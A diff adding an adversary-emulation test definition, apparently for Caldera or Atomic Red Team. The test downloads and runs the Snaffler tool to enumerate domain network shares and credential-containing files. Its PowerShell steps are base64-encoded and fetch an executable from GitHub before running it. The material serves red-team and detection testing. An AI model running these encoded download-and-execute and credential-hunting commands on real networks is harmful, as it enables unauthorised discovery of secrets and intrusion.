@@ -1,0 +1,18 @@
+- id: e6389c18-11ed-504c-9216-fe77cb33a8f4
+  name: Soumaia ART Tests - Enumerate All Network Shares with Snaffler
+  description: "Snaffler is an open-source tool that has been used by various threat groups, including Scattered Spider/Muddled Libra, to enumerate accessible shares and credential-containing files within a domain. \n[Reference](https://unit42.paloaltonetworks.com/muddled-libra/)"
+  tactic: discovery
+  technique:
+    attack_id: T1135
+    name: Network Share Discovery
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABTAG4AYQBmAGYAbABlAHIALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AA==
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAFMAbgBhAGYAZgBDAG8AbgAvAFMAbgBhAGYAZgBsAGUAcgAvAHIAZQBsAGUAYQBzAGUAcwAvAGQAbwB3AG4AbABvAGEAZAAvADEALgAwAC4AMQA1ADAALwBTAG4AYQBmAGYAbABlAHIALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAFMAbgBhAGYAZgBsAGUAcgAuAGUAeABlACIA
+          }
+          invoke-expression 'cmd /c start powershell -command { cmd /c "$env:TEMP\ART-ExternalPayloads\Snaffler.exe" -a -o "$env:temp\T1135SnafflerOutput.txt" }; start-sleep 90; stop-process -name "snaffler"'
+        cleanup: |-
+          remove-item "$env:temp\T1135SnafflerOutput.txt" -force -erroraction silentlycontinue
